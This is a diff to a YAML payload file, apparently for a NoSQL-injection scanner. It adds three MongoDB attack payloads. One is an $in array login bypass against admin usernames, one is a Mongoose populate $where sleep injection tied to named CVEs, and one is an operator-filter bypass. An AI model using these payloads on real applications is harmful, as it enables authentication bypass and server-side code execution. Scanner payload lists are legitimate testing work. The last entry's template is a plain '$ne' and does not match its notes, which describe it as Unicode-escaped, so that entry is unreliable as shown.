@@ -35,6 +35,18 @@ payloads:
     template: 'username[$regex]=^{canary}'
     confidence: suspected
     notes: Express+qs query-string variant of $regex.
+  - id: mongo_in_array_bypass
+    template: '{"$in":["admin","administrator","root"]}'
+    confidence: likely
+    notes: $in operator array-bypass; matches any of a common admin-username list in a single query, useful on forms that only block $ne/$gt.
+  - id: populate_match_where_sleep
+    template: '{"path":"{param}","match":{"$where":"sleep(3000)||true"}}'
+    confidence: suspected
+    notes: Mongoose populate({match}) $where injection (CVE-2024-53900/CVE-2025-23061); time-based blind confirms arbitrary JS execution reached via a nested populate filter.
+  - id: unicode_operator_bypass
+    template: '{"$ne":null}'
+    confidence: suspected
+    notes: Unicode-escaped operator name ($ne) evades naive "$ne" string-match filters while the MongoDB driver still parses it as the $ne operator.
 mutations:
   - name: case_flip
     description: Operator names are case-sensitive — flips produce known errors.
